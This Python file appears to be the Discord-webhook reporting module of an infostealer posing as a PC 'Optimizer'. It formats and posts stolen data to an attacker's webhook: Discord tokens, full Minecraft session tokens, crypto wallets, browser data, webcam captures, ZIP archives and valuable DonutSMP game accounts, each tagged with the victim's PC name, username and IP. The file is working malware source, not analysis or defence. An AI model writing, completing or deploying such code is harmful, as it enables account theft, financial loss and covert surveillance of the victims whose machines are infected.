import aiohttp
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

async def send_discord_notification(webhook_url: str, log_type: str, data: dict, pc_info: dict = None):
    """
    Send a formatted embed to a Discord Webhook.
    """
    if not webhook_url:
        return

    try:
        # Determine color and title based on log type
        color = 0x5865F2 # Default Discord Blue
        title = f"New {log_type.upper()} Log"
        
        if log_type == 'discord':
            color = 0x7289da
            title = "👾 New Discord Token"
        elif log_type == 'minecraft':
            color = 0x2d7d46
            title = "⛏️ Minecraft Session"
        elif log_type == 'wallet':
            color = 0xf59e0b
            title = "💰 Crypto Wallet Found"
        elif log_type == 'browser':
            color = 0xff4500
            title = "🌐 Browser Data"
        elif log_type == 'webcam':
            color = 0xef4444
            title = "📸 Webcam Capture"
        elif log_type == 'zip_upload':
            color = 0x10b981
            title = "📦 ZIP Archive Uploaded"
        elif log_type == 'donutsmp_hit':
            color = 0x22c55e  # Green
            title = "🍩 DonutSMP High Value Account!"

        # Prepare formatting fields
        fields = []
        
        # PC Info Field
        pc_name = pc_info.get('pc_name', 'Unknown') if pc_info else data.get('pc_name', 'Unknown')
        pc_user = pc_info.get('pc_user', 'Unknown') if pc_info else data.get('pc_user', 'Unknown')
        ip = pc_info.get('ip', 'Unknown') if pc_info else data.get('ip', 'Unknown')
        
        fields.append({
            "name": "💻 PC Info",
            "value": f"User: `{pc_user}`\nPC: `{pc_name}`\nIP: `{ip}`",
            "inline": False
        })
        
        # Content based on type
        desc = ""
        
        if log_type == 'discord':
            username = data.get('username', 'Unknown')
            nitro = "Yes" if data.get('nitro') else "No"
            fields.append({"name": "User", "value": f"`{username}`", "inline": True})
            fields.append({"name": "Nitro", "value": f"`{nitro}`", "inline": True})
            token = data.get('token', '')
            if token:
                desc = f"Token: `{token[:25]}...`"

        elif log_type == 'minecraft':
            player = data.get('player', 'Unknown')
            fields.append({"name": "Player", "value": f"`{player}`", "inline": True})

        elif log_type == 'zip_upload':
            filename = data.get('filename', 'unknown.zip')
            size = data.get('size', 0) / 1024 / 1024 # MB
            fields.append({"name": "File", "value": f"`{filename}`", "inline": True})
            fields.append({"name": "Size", "value": f"{size:.2f} MB", "inline": True})
            
        elif log_type == 'webcam':
            desc = "Image captured and saved to panel."
            
        elif log_type == 'donutsmp_hit':
            player = data.get('player', 'Unknown')
            balance = data.get('balance', '$0')
            shards = data.get('shards', 0)
            kills = data.get('kills', 0)
            deaths = data.get('deaths', 0)
            playtime = data.get('playtime', '0h')
            token = data.get('token', 'N/A')
            
            fields.append({"name": "👤 Player", "value": f"`{player}`", "inline": True})
            fields.append({"name": "💵 Balance", "value": f"**{balance}**", "inline": True})
            fields.append({"name": "💎 Shards", "value": f"`{shards}`", "inline": True})
            fields.append({"name": "⚔️ Kills", "value": f"`{kills}`", "inline": True})
            fields.append({"name": "💀 Deaths", "value": f"`{deaths}`", "inline": True})
            fields.append({"name": "⏱️ Playtime", "value": f"`{playtime}`", "inline": True})
            
            # Full token in description
            desc = f"**MC Session Token:**\n```{token}```"

        # Construct Embed
        embed = {
            "title": title,
            "description": desc,
            "color": color,
            "fields": fields,
            "footer": {
                "text": f"Optimizer Unified • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            }
        }

        async with aiohttp.ClientSession() as session:
            payload = {
                "username": "Optimizer Notification",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/9373/9373887.png",
                "embeds": [embed]
            }
            async with session.post(webhook_url, json=payload) as resp:
                if resp.status not in [200, 204]:
                    logger.error(f"Failed to send webhook: {resp.status}")

    except Exception as e:
        logger.error(f"Error sending webhook: {e}")
